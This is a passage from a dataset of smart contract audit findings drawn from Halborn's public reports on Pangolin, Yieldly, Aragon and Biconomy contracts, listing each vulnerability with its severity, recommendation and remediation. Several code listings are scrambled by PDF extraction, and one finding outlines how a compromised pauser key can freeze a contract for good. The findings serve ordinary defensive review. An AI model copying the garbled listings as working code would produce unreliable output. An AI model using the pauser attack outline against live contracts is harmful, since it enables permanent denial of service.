acknowledged this issue and will address it 18 ", "labels": ["Halborn", "Pangolin_AllocationVester", "Severity: Low"]}, {"title": "MISSING EVENTS EMITTING", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Pangolin_AllocationVester_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "has been observed It emitting events. AllocationVester contract: that missing The following functions should emit events in the functionalities important are Fuctions with events missing:  withdraw()  harvest() Risk Level: Likelihood - 1 Impact - 2 Recommendation: Consider emitting an event when calling related functions on the list above. Remediation Plan: SOLVED: The Pangolin Team solved this issue by defining new events that will be emitted every time a reward pickup or withdrawal occurs. Commit ID: d8137ff12bfbf6c083939b8d487e6dd47a70a3ea 19 ", "labels": ["Halborn", "Pangolin_AllocationVester", "Severity: Informational"]}, {"title": "MISSING ZERO ADDRESS CHECK", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Pangolin_AllocationVester_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The constructor of the AllocationVester contract is missing address validation. The distributionToken parameter should be checked to be non-zero. This is considered a best practice. Code Location: Listing 4: Missing zero address check (Line 61) 60 61 62 constructor ( IERC20 distributionToken ) { token = distributionToken ; } Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to validate that each address inputs in the constructor and other critical functions are non-zero. Remediation Plan: SOLVED: The Pangolin Team solved this issue by implementing a zero check address in the contract constructor. Commit ID: 2a5bb1afe0e1cb0aab67b9f8e75970a3ad75c992 20 ", "labels": ["Halborn", "Pangolin_AllocationVester", "Severity: Informational"]}, {"title": "MISSING INTEGER UNDERFLOW PROTECTION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Algorand Smart Contract Audit/Yieldly_Finance_Multi_Staking_Algorand_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In computer programming, an integer overflow occurs when an arithmetic operation attempts to create a numeric value that is outside the range that can be represented with a given number of bits, either larger than the maximum or lower than the minimum value. Side Note: Listing 1 1 b - A minus B , where A and B are byte - arrays interpreted as big - endian unsigned integers . Fail on underflow . Code Location: Listing 2 1 resumeRewardCalc : 2 // Calculate the amount of rewards unlocked 3 byte \" End_Date \" 4 app_global_get 5 byte \" Start_Date \" 6 app_global_get 7 b - 8 store 10 9 load 10 10 byte \" End_Date \" 11 app_global_get 12 load 13 13 b - 14 b - 15 byte \" Rewards_Locked \" // \" End_Date \" // bytex // bytex \" Start_Date \" // bytex bytex // bytex // null // bytex // bytex \" End_Date \" // bytex intx // bytex intx intx // bytex intx // bytex // bytex \" R TODO { HANDLE UNDERFLOW } 13 Listing 3 1 resumeRewardCalc : 2 // Calculate the amount of rewards unlocked 3 byte \" End_Date \" 4 app_global_get 5 byte \" Start_Date \" 6 app_global_get 7 b - 8 store 10 9 load 10 10 byte \" End_Date \" 11 app_global_get 12 load 13 13 b - 14 b - 15 byte \" Rewards_Locked \" 16 app_global_get 17 b * 18 load 10 19 b / 20 byte \" Rewards_Unlocked \" // intx \" Rewards_Unlocked \" 21 app_global_get 22 b - 23 store 2 // \" End_Date \" // bytex // bytex \" Start_Date \" // bytex bytex // bytex // null // bytex // bytex \" End_Date \" // bytex intx // bytex intx intx // bytex intx // bytex // bytex \" Rewards_Locked \" // bytex intx // bytex // bytex bytex // bytex // intx intx // intx // null TODO { HANDLE UNDERFLOW } Recommendation: The variable should be checked with pre-condition. Remediation Plan: SOLVED: Yieldly.Finance implemented necessary checks. 14 ", "labels": ["Halborn", "Yieldly_Finance_Multi_Staking_Algorand", "Severity: Medium"]}, {"title": "LACK OF MAXIMUM FEE BOUND DEFINITION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Algorand Smart Contract Audit/Yieldly_Finance_Multi_Staking_Algorand_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The fee does not have an upper/lower limit, which may make liquidity provider make no profit. The fee is defined as constant, therefore fee could not set by an admin on the contracts. Code Location: Listing 4: Fee is Defined Constant 1 // Makes sure the fee from the first txn is at least 2000 ( min // Fee // Fee intx // 1||0 // null ( if 0 then Failed ) amount ) 2 gtxn 0 Fee 3 int 2000 4 >= 5 assert Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider to defined setter function fee function. However, the function should have upper/lower limit on the fee setter function. Remediation Plan: NOT APPLICABLE: The Yieldly.Finance claims that the implementation should be having minimum 2000 fee. The documentation has been reviewed and the implementation has been confirmed. 15 ", "labels": ["Halborn", "Yieldly_Finance_Multi_Staking_Algorand", "Severity: Informational"]}, {"title": "LACK OF MULTISIG PROGRAM", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Algorand Smart Contract Audit/Yieldly_Finance_Multi_Staking_Algorand_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The principal benefit of multisig is that it creates added redundancy in key management. While single signature addresses require only a single key for transactions, multisignature addresses require multiple keys. To protect against malicious admin, it may be necessary to use a multi signature. By using this mechanism, a malicious admin actions could be prevented. Code Location: 16 Example Definition: Listing 5: Multisig Implementation 2 goal account multisig new -T 2 account1 account2 account3 -d ~/ node / data 3 goal clerk multisig signprogram -p / tmp /* . teal -a account1 -A account2 -o / tmp / simple . lsig -d ~/ node / data Risk Level: Likelihood - 1 Impact - 1 Recommendation: In the contract, The multi-signature should be implemented over a creator account. Remediation Plan: ACKNOWLEDGED: Yieldly.Finance consider to use multi-signature on the main net deployment. 17 ", "labels": ["Halborn", "Yieldly_Finance_Multi_Staking_Algorand", "Severity: Informational"]}, {"title": "MISSING PROXY ASSET DEFINITION ON THE FUNCTIONS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Algorand Smart Contract Audit/Yieldly_Finance_Multi_Staking_Algorand_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the Yieldly.Finance workflow, Escrow connection is made with a proxy contract. According to documentation, Escrow only allows transactions tied with proxy. But, in some functions, transactions dont go through the Proxy asset. Code Location: Listing 6: winnerProgram Function (Lines 1) 1 2 3 4 5 6 7 8 9 let txn = await configs . winnerProgram ( account2 , escrowAddress , algoAppId , asaAppId , trackerAppId , winner , rateAppId ); Listing 7: assetOptoutApplication Function (Lines 1) 1 2 3 4 5 6 let txn1 = await configs . assetOptoutApplication ( account1 , escrowAddress , optingAppId , assetId ); 18 Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to construct transactions through a proxy which is interacting with escrow. Remediation Plan: NOT APPLICABLE: Yieldly.Finance does not need to use proxy for the escrow asset after program version (5). 19 ", "labels": ["Halborn", "Yieldly_Finance_Multi_Staking_Algorand", "Severity: Informational"]}, {"title": "MISSING FREEZE/REVOKE ASSETS DEFINITION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Algorand Smart Contract Audit/Yieldly_Finance_Multi_Staking_Algorand_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "When an asset is created, the contract can provide a freeze address and a defaultfrozen state. If the defaultfrozen state is set to true the corresponding freeze address must issue unfreeze transactions, one per account, to allow trading of the asset to and from that account. This may be useful in situations that require holders of the asset to pass certain checks prior to ownership. (KYC/AML) The clawback address, if specified, is able to revoke the asset from any account and place them in any other account that has previously opted-in. This may be useful in situations where a holder of the asset breaches some set of terms that you established for that asset. You could issue a freeze transaction to investigate, and if you determine that they can no longer own the asset, you could revoke the assets. 20 Asset Explorer: Risk Level: Likelihood - 1 Impact - 1 Recommendation: According to workflow, the application should activate freeze and revoke assets. If the application would rather ensure to asset holders that the application will never have the ability to revoke or freeze assets, set the clawback/freeze address to null. Remediation Plan: ACKNOWLEDGED: Yieldly.Finance does not need to use revoke or freeze feature on the assets. The Revoke and Freeze addresses are disabled. 21 THANK YOU FOR CHOOSING", "labels": ["Halborn", "Yieldly_Finance_Multi_Staking_Algorand", "Severity: Informational"]}, {"title": "SELF PERMISSIONS DO CASCADE TO EXTERNAL CONTRACTS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Aragon_aragonOS_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The _auth function on the PermissionManager is being used to verify if a given permission (permission id) is set to a contract (where) from a specific origin (from). The check does verify in two different scenarios:  The where contract does have the permission from the current sender.  The current contract (address(this)) does hold the permission from the current sender. This means that if a given permission (PERMx) is set to the self contract, any call to any contract (anywhere) that may use the permission (PERMX) will succeed due to the second check. It has been seen that the entire code base is always using a where of address(this) which means that the where check is redundant and unused and adds a possible critical scenario described below. Code Location: Listing 1: src/core/permission/PermissionManager.sol (Lines 336,337) 334 function _auth ( address _where , bytes32 _permissionId ) private view  { 335 336 if (  data ) && 337 338 339 340 341 342 343 ! isGranted ( address ( this ) , msg . sender , _permissionId , msg . ! isGranted ( _where , msg . sender , _permissionId , msg . data ) ) { revert Unauthorized ({ here : address ( this ) , where : _where , who : msg . sender , permissionId : _permissionId 15 344 345 346 } }) ; } Risk Level: Likelihood - 1 Impact - 5 Recommendation: It is recommended that the where check is removed from the _auth function on the PermissionManager. If thats not possible due to architectural designs on future releases, the documentation should clearly state that providing a different where clause rather than address(this) can lead to bad behaviors and possible privilege escalation issues.  If the contract x inherits from permission manager, it should only If be using the modifier such as auth(address(this, permission). not, and it has auth(where, permission), this is dangerous because if user A is granted permission Y on address(this)= x, it automatically means it has permission Y anywhere.  Plugins or other contracts that are part of the DAO shouldnt use the modifier of Permission Manager. If they do, the same situation as the previous point could happen. This is not possible unless a custom contract is written. Remediation Plan: SOLVED: The Aragon team did change all auth(where, permission) modifiers to use auth(permission) which explicitly uses the DAO authorization system and does not rely on the Permissionmanager function. 16 ", "labels": ["Halborn", "Aragon_aragonOS", "Severity: Medium"]}, {"title": "UNTRUSTED PLUGIN USAGE CAN CAUSE DOS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Aragon_aragonOS_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Installing or upgrading a plugin without prior validation can lead to the contract and DAO being nonfunctional. This is possible if a plugin does self-destruct during the installation or upgrade. Furthermore, not only caution should be taken during the installation/upgradability but also on the deployed implementation contract as it would lead all proxied contracts to be unusable. Risk Level: Likelihood - 1 Impact - 5 Recommendation: All contracts using UUPSUpgradeable should make sure that the contract implementation is initialized and access controls mechanism are in place so no one can perform any upgrade and self-destruct the implementation A good suggestion is to use _disableInitializers on contract itself. those contract constructors. Doing so could cause all proxies to be invalid and nonfunctional. Furthermore, DAOs should make sure that used plugins do not contain untrusted calls and executions. Remediation Plan: SOLVED: The Aragon team added _disableInitializers and stated that no action could happen due to a bad implementation initialization or take- over. 17 ", "labels": ["Halborn", "Aragon_aragonOS", "Severity: Medium"]}, {"title": "MERKLE ROOT RE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Aragon_aragonOS_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The merkleMint function on the MerkleMinter contract does allow specifying a previous used _merkleRoot. The merkle proofs do not consider the token being used as part of the proof. This allows the same proof, with the same merkle root, to be used for any token. This means that the created MerkleDistributor will successfully mint the tokens independently of the This scenario is unlikely to internal token used for a valid proof. happen, but bots could be constantly scanning the blockchain for such scenario and profit from it. Risk Level: Likelihood - 3 Impact - 1 Recommendation: The code should check that the _merkleRoot is not reused, this will prevent proof re-usage to mint another token from a previous used proof of another token. With the current code implementation, it is hard to prevent this scenario on multiple MerkleMinter being generated with the TokenFactory as it would require the factory to keep track of the roots. However, it is possible to protect against this on a MerkleMinter bases and assume the other scenario by checking the re-usage of the Merkle Root on the MerkleMinter contract itself. Remediation Plan: NOT APPLICABLE: The Aragon team stated that this is considered a feature rather than a potential issue, as this would allow multiple tokens to be generated for the same address list without having to modify the root. 18 ", "labels": ["Halborn", "Aragon_aragonOS", "Severity: Low"]}, {"title": "EMPTY SUBDOMAIN ALLOWED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Aragon_aragonOS_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The registerPluginRepo function on the PluginRepoRegistry contract does allow specifying an empty string as a subdomain, which will result in the c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 hash node. This is allowed due to the registering function and the isSubdomainValid internal function considering an empty string as a valid subdomain. Risk Level: Likelihood - 2 Impact - 2 Recommendation: It is recommended that the isSubdomainValid function does verify that the string is not empty to cover all possible invalid subdomains. Remediation Plan: SOLVED: The code now reverts if the subdomain string is empty before the isSubdomainValid check. 19 ", "labels": ["Halborn", "Aragon_aragonOS", "Severity: Low"]}, {"title": "MISSING CALLBACK SELECTOR ZERO CASE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Aragon_aragonOS_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The _registerCallback function on the CallbackHandler contract does allow registering the _callbackSelector of 0x00000000 which refers to the Solid- ity EVM fallback or receive functions. The callBackSelector is expected to be equal to _magicNumber in most of the cases. However, it is possible that _magicNumber is different from callBackSelector. For the former, when they are equal, registering the _magicNumber/callBackSelector of 0x00000000 will cause any call not handled by the EVM, such as data=0 x to revert even after register. However, the _handleCallback, does treat the 0x0 (_magicNubmer) as UNREGISTERED_CALLBACK which will cause the transaction to revert. Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended that if the DAO wants to register the callBackSelector=0 x00000000 to use _magicNumber different from 0x0. Furthermore, it will be a nice option to enforce that the _registerCallback function _magicNumber is always different from 0x and add an unregisterCallback function which sets the _magicNumber for a given callBackSelector to 0x0. Remediation Plan: ACKNOWLEDGED: The Aragon team and Halborn agreed on the low severity of this issue and stated that reverting unhandled selectors to default is a good option, as it would force the developers to explicitly add the selector if it is required. 20 ", "labels": ["Halborn", "Aragon_aragonOS", "Severity: Informational"]}, {"title": "UNUSED CODE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Aragon_aragonOS_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Furthermore, The _applyRatioFloored is never being used in the code. as the function name states, the result will be floored and the decimal precision lost. It is recommended to either remove the code or take extra precaution when using the function, as unexpected results may occur. Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to remove any unused code or provide valid recommenda- tions and suggestions on the documentation on how to use those. Remediation Plan: SOLVED: The Aragon team did remove the unused code. 21 MANUAL TESTING 22 4.1 DAO  Permissions are correctly described.  No missing arguments and bad interface implementations.  All inherited contracts are upgradeable safe.  Initializer does have all initializers for inherited contracts.  All calls do check for valid return value and revert otherwise (if not prevented by the failure mapping).  Since the contract does use funds, it has both fallback and receive functions implemented.  Setters do have ACL permissions. 4.2 PermissionManager  All inherited contracts are upgradeable safe.  Permissions are correctly described.  No missing arguments and bad interface implementations.  Granting permissions are implemented as expected  Validating given permissions is implemented as expected, one issue described in the report as a vulnerability.  Granting ROOT permissions or protected permission to ANY_ADDR is restricted correctly.  Revoking does revoke correctly and works for ANY_ADDR. However, it should be stated that revoking a strictly specified where/from permission with ANY_ADDR will not revoke the permission. ANY_ADDR on the revoke function cannot be treated as a clean all permissions. 4.3 DAOFactory  Internal permissions are correctly used.  DAO permissions are the ones necessary for the operation and all registered in the isPermissionRestrictedForAnyAddr.  All temporary permissions given to the factory are successfully 23 G N I T S E T L A U N A M removed afterward.  The newly created dao is registered on the DAORegistry. 4.4 InterfaceBasedRegistry  It does not allow registering twice the same address  All inherited contracts are upgradeable safe.  Permissions are correctly described.  No missing arguments and bad interface implementations. 4.5 PluginSetupProcessor  Permissions are correctly described.  No missing arguments and bad interface implementations.  All the prepare statements are using preparedSetupIdToBlockNumber internally to store the current state. All the states are differ- entiated against them by the action, such as install, upgrade and uninstall. This is important; otherwise, a prepare statement will be applicable in any action independently of the prepare action. Meaning that a prepareUninstall could be used on the applyUpdate state, causing bad behaviours and unexpected results.  The installation preparation does verify that the plugin repo is registered.  The prepareUpdate does not verify that the repo is registered, as it is assumed to be if installed by checking currentAppliedSetupId. 4.6 ENSSubdomainRegistrar  It does correctly create the ENS node by packing the base node and label, in this order.  Label is being passed as the keccak256 of the subdomain as specified in the ENS documentation. 24 G N I T S E T L A U N A M  Internal permissions are correctly used and delegated to the DAO. 4.7 AddresslistVoting  Proposal creation is based on the Addresslist implementation, which uses the CheckpointsUpgradeable contract from OZ.  The ability to create a proposal requires the member to have the voting power in the block before the proposal creation. This does prevent possible front-runs.  If a user gets removed from the list, it will still be able to vote for proposals that were created before its removal. 4.8 TokenVoting  Proposal creation is based on the ERC20Voting implementation, which uses snapshot mechanisms to store the balance for a given address back in time.  The ability to create a proposal requires the member to have the voting power in the block before the proposal creation. This does prevent possible front-runs.  New voting power (either increment or decrement) will not be taken into consideration for past proposals, which means that a user could still vote if it had enough power before the proposal was created. G N I T S E T L A U N A M 25 ", "labels": ["Halborn", "Aragon_aragonOS", "Severity: Informational"]}, {"title": "RENOUNCING PAUSER ROLE WHEN CONTRACT IS PAUSED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_LiquidityPoolManager_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "There are multiple roles on the LiquidityPoolManager contract such as Owner, Pauser and TrustedForwarder. According to the contract functions, it is possible to set Owner and Pauser addresses to zero by using renounceOwnership and renouncePauser functions. The Pauser role can pause the contract. If the private key of this Pauser is compromised, an attacker can pause the contract and renounce the pauser role, then the attacker can render the contract useless forever. Risk Level: Likelihood - 4 Impact - 4 13 Proof Of Concept: This attack has three stages which are described below: 1. In the first screenshot, everything looks proper. Three functions are called during the step one: isPaused(), isPauser() and pauser() public functions in order. 2. After the first step, the pause() function has to be called by any user which has Pauser role. It can be seen that isPaused() function returned true as a boolean variable on the following screenshot. 14 3. Finally, the renouncePauser() function needs to be called on the contract that is in the pause state. After this action, the Pauser address will be set to address(0) and the contract will never be able to return from the paused state. 15 Recommendation: It is recommended to add the whenNotPaused modifier to the renouncePauser function. In addition, the pauser role should not be the address(0) for not disrupting the flow of the contract. Remediation Plan: SOLVED: Biconomy Team solved this issue by adding whenNotPaused modifier to the renouncePauser function. 16 ", "labels": ["Halborn", "Biconomy_LiquidityPoolManager", "Severity: High"]}, {"title": "OWNER CAN RENOUNCE OWNERSHIP", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_LiquidityPoolManager_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "The Owner of the contract is usually the account that deploys the contract. As a result, the Owner is able to perform some privileged functions like setBaseGas() and setExecutorManager(). In the LiquidityPoolManager.sol smart contract, the renounceOwnership function is used to renounce the Owner permission. Renouncing ownership before transferring would result in the contract having no Owner, eliminating the ability to call privileged functions. Risk Level: Likelihood - 2 Impact - 3 Code Location: Listing 1: LiquidityPoolManager.sol Ownable (Lines 15) 15 contract LiquidityPoolManager is ReentrancyGuard , Ownable , BaseRelayRecipient , Pausable { 16 Recommendation: Its recommended that the Owner is not able to call renounceOwnership without transferring the Ownership to other address before. In addition, if a multi-signature wallet is used, calling renounceOwnership function should be confirmed for two or more users. As an other solution, Renounce Ownership functionality can be disabled with the following line. 17 Listing 2: Disable RenounceOwnerShip (Lines 1) 1 2 3 function renounceOwnership () public override onlyOwner { revert ( \" can 't renounceOwnership here \"); // not possible with this smart contract } Remediation Plan: SOLVED: Biconomy Team added a new statement for renounceOwnership and renouncePauser functions to solve the issue. 18 ", "labels": ["Halborn", "Biconomy_LiquidityPoolManager", "Severity: Low"]}, {"title": "LACK OF ZERO ADDRESS CHECK ON CONSTRUCTOR", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_LiquidityPoolManager_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "The LiquidityPoolManager contract includes different type of roles. For example, there is Owner role for setting the adminFee value. For another example, the Pauser role pauses the contract if something wrong with the transactions or contract logic. It is important to provide these roles to valid addresses. These roles should be driven by people. There are too many address checks in the LiquidityPoolManager contract to keep these roles safe. For example, it is not possible to set Owner, Pauser and TrustedForwarder addresses to address(0) after initialization of the contract. However, it is possible to set Pauser address to address(0) because of the lack of address control on constructor. Risk Level: Likelihood - 2 Impact - 3 Code Location: Listing 3: LiquidityPoolManager.sol (Lines 68,69,70,71) 67 constructor ( address _executorManagerAddress , address owner , address pauser , address _trustedForwarder , uint256 _adminFee ) public Ownable ( owner ) Pausable ( pauser ) { require ( _executorManagerAddress != address (0) , \" ExecutorManager Contract Address cannot be 0 \"); require ( owner != address (0) , \" Owner Address cannot be 0 \"); require ( _trustedForwarder != address (0) , \" TrustedForwarder Contract Address cannot be 0 \" ); require ( _adminFee != 0 , \" AdminFee cannot be 0 \" ); executorManager = ExecutorManager ( _executorManagerAddress ) ; trustedForwarder = _trustedForwarder ; adminFee = _adminFee ; 68 69 70 71 72 73 74 19 75 76 } baseGas = 21000; Recommendation: Implementing zero address check on constructor strongly recommended by Halborn team. Remediation Plan: SOLVED: Biconomy Team added address control check to the constructor. 20 ", "labels": ["Halborn", "Biconomy_LiquidityPoolManager", "Severity: Low"]}, {"title": "TAUTOLOGY EXPRESSIONS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_LiquidityPoolManager_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "In contract LiquidityPoolManager.sol, tautology expressions have been detected. Such expressions are of no use since they always evaluate true/false regardless of the context they are used in. Risk Level: Likelihood - 2 Impact - 2 Code Location: Listing 4: LiquidityPoolManager.sol (Lines 154) 153 function addTokenLiquidity ( address tokenAddress , uint256 amount ) public tokenChecks ( tokenAddress ) whenNotPaused { 154 require ( amount > 0, \" amount should be greater then 0 \"); Listing 5: LiquidityPoolManager.sol (Lines 273) 272 function withdrawErc20 ( address tokenAddress ) public onlyOwner whenNotPaused { 273 274 275 uint256 profitEarned = ( IERC20 ( tokenAddress ). balanceOf ( address ( this )) ). sub ( tokensInfo [ tokenAddress ]. liquidity ) ; require ( profitEarned > 0, \" Profit earned is 0 \" ); address payable sender = _msgSender () ; Recommendation: Correct the expressions. declared as type uint256, they are always greater or equal to 0. Since amount and profitEarned variables are 21 Remediation Plan: SOLVED: Biconomy Team fixed expressions on modifiers related to the current issue. 22 ", "labels": ["Halborn", "Biconomy_LiquidityPoolManager", "Severity: Low"]}, {"title": "POSSIBLE RE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_LiquidityPoolManager_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "The Re-Entrancy attack is performed when it is possible to interrupt an execution in the middle, initiated over, and both runs can complete In the context of Ethereum Smart without any errors in execution. Contracts, Re-Entrancy can lead to serious vulnerabilities such as loss of assets. During the tests, a pattern seen in Smart contract re-entrancy attacks was detected. The new withdraw functions added with the latest update are using call.value() method which is less secure than transfer and send against possible re-entrancy attacks. These new functions are only callable by contract owner. This situation decreases the severity of the issue. 23 Code Location: Listing 6: LiquidityPoolManager.sol (Lines 163) 156 function removeNativeLiquidity ( uint256 amount ) external whenNotPaused nonReentrant { 157 158 159 160 161 162 163 164 165 166 167 require ( amount != 0 , \" Amount cannot be 0 \"); address payable sender = _msgSender () ; require ( tokensInfo [ NATIVE ]. liquidityProvider [ sender ] >= amount , \" Not enough balance \"); tokensInfo [ NATIVE ]. liquidityProvider [ sender ] = tokensInfo [ NATIVE ]. liquidityProvider [ sender ]. sub ( amount ); tokensInfo [ NATIVE ]. liquidity = tokensInfo [ NATIVE ]. liquidity . sub ( amount ); ( bool success , ) = sender . call { value : amount }( \" \"); require ( success , \" Native Transfer Failed \" ); emit LiquidityRemoved ( NATIVE , amount , sender ); } Listing 7: LiquidityPoolManager.sol (Lines 254) 247 function sendFundsToUser ( address tokenAddress , uint256 amount , address payable receiver , bytes memory depositHash , uint256 tokenGasPrice ) external nonReentrant onlyExecutor tokenChecks ( tokenAddress ) whenNotPaused { 248 249 250 251 252 253 254 255 256 257 258 259 uint256 initialGas = gasleft () ; . . . if ( tokenAddress == NATIVE ) { require ( address ( this ). balance >= amountToTransfer , \" Not Enough Balance \"); ( bool success , ) = receiver . call { value : amountToTransfer }( \" \"); require ( success , \" Native Transfer Failed \" ); } else { require ( IERC20 ( tokenAddress ). balanceOf ( address ( this )) >= amountToTransfer , \" Not Enough Balance \"); SafeERC20 . safeTransfer ( IERC20 ( tokenAddress ) , receiver , amountToTransfer ); } 24 Listing 8: LiquidityPoolManager.sol (Lines 336) 328 function withdrawNative () external onlyOwner whenNotPaused { 329 330 331 . sub ( tokensInfo [ NATIVE ]. liquidity ) . sub ( adminFeeAccumulatedByToken [ uint256 profitEarned = ( address ( this ). balance ) NATIVE ]) . sub ( gasFeeAccumulatedByToken [ NATIVE ]) ; require ( profitEarned != 0 , \" Profit earned is 0 \"); address payable sender = _msgSender () ; ( bool success , ) = sender . call { value : profitEarned }( \" \"); require ( success , \" Native Transfer Failed \" ); emit fundsWithdraw ( address ( this ) , sender , profitEarned ); 332 333 334 335 336 337 338 339 340 } Listing 9: LiquidityPoolManager.sol (Lines 346) 342 function withdrawNativeAdminFee ( address payable receiver ) external 343 344 345 346 347 348 349 350 onlyOwner whenNotPaused { uint256 adminFeeAccumulated = adminFeeAccumulatedByToken [ NATIVE ]; require ( adminFeeAccumulated != 0 , \" Admin Fee earned is 0\" ) ; adminFeeAccumulatedByToken [ NATIVE ] = 0; ( bool success , ) = receiver . call { value : adminFeeAccumulated }( \"\" ); require ( success , \" Native Transfer Failed \" ); emit AdminFeeWithdraw ( address ( this ) , receiver , adminFeeAccumulated ); } Listing 10: LiquidityPoolManager.sol (Lines 356) 352 function withdrawNativeGasFee ( address payable receiver ) external onlyOwner whenNotPaused { uint256 gasFeeAccumulated = gasFeeAccumulatedByToken [ NATIVE ]; require ( gasFeeAccumulated != 0 , \" Gas Fee earned is 0 \"); gasFeeAccumulatedByToken [ NATIVE ] = 0; 353 354 355 25 356 357 358 359 360 ( bool success , ) = receiver . call { value : gasFeeAccumulated }( \" \" ); require ( success , \" Native Transfer Failed \" ); emit GasFeeWithdraw ( address ( this ) , receiver , gasFeeAccumulated ); } Recommendation: It is recommended to use: Listing 11: Recommendation 1 ( bool success , ) = receiver . send ( adminFeeAccumulated ); instead of Listing 12: Recommendation 1 ( bool success , ) = receiver . call { value : adminFeeAccumulated }( \"\" ) ; since the send() method has gas limit (2300) while call.value() method uses all remaining gas. Remediation Plan: SOLVED: Biconomy Team solved this issue by replacing the call.value() method with send() method which has gas limit. 26 ", "labels": ["Halborn", "Biconomy_LiquidityPoolManager", "Severity: Low"]}, {"title": "EXPERIMENTAL FEATURES ENABLED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_LiquidityPoolManager_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "ABIEncoderV2 is enabled and the use of experimental features could be dangerous on live deployments. The experimental ABI encoder does not handle non-integer values shorter than 32 bytes properly. This applies to bytesNN types, bool, enum and other types when they are part of an array or a struct and encoded directly from storage. This means these storage references have to be used directly inside abi.encode(...) as arguments in external function calls or in event data without prior assignment to a local variable. The types bytesNN and bool will result in corrupted data while enum might lead to an invalid revert. Risk Level: Likelihood - 1 Impact - 2 Code Location: Listing 13: LiquidityPoolManager.sol (Lines 4) 1 // SPDX - License - Identifier : MIT 2 3 pragma solidity 0.7.6; 4 pragma experimental ABIEncoderV2 ; Recommendation: When possible, do not use experimental features in the final live deployment. Validate and check that all the conditions above are true for integers and arrays (i.e. all using uint256). 27 Remediation Plan: SOLVED: Biconomy Team removed experimental keyword on pragma section. 28 ", "labels": ["Halborn", "Biconomy_LiquidityPoolManager", "Severity: Informational"]}, {"title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_LiquidityPoolManager_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "In public functions, array arguments are immediately copied to memory, while external functions can read directly from calldata. Reading Public functions need to calldata is cheaper than memory allocation. write the arguments to memory because public functions may be called internally. Internal calls are passed internally by pointers to memory. Thus, the function expects its arguments being located in memory when the compiler generates the code for an internal function. Also, methods do not necessarily have to be public if they are only called within the contract-in such case they should be marked internal. In addition to that if a function not used in the contract second time, external keyword should be appended to the function for a better gas optimization. 29 Code Location: Misused Functions Without External Keyword: Listing 14: LiquidityPoolManager.sol 1 changeAdminFee () 2 setExecutorManager () 3 setTrustedForwarder () 4 setTokenTransferOverhead () 5 addSupportedToken () 6 removeSupportedToken () 7 updateTokenCap () 8 addNativeLiquidity () 9 removeNativeLiquidity () 10 addTokenLiquidity () 11 removeTokenLiquidity () 12 depositNative () 13 sendFundsToUser () 14 withdrawErc20 () 15 withdrawNative () Recommendation: Consider as much as possible declaring external variables instead of public variables. As for best practice, you should use external if you expect that the function will only be called externally and use public if you need to call the function internally. To sum up, all can access to public functions, external functions only can be accessed externally and internal functions can only be called within the contract. Remediation Plan: SOLVED: Biconomy Team replaced external to public in several functions. 30 ", "labels": ["Halborn", "Biconomy_LiquidityPoolManager", "Severity: Informational"]}, {"title": "MISSING EVENTS EMITTING", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_LiquidityPoolManager_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "It has been observed that critical functionality is missing emitting event for setTrustedForwarder and changeAdminFee functions. These functions should emit events after completing the transactions. Risk Level: Likelihood - 1 Impact - 1 Code Location: Listing 15: LiquidityPoolManager.sol 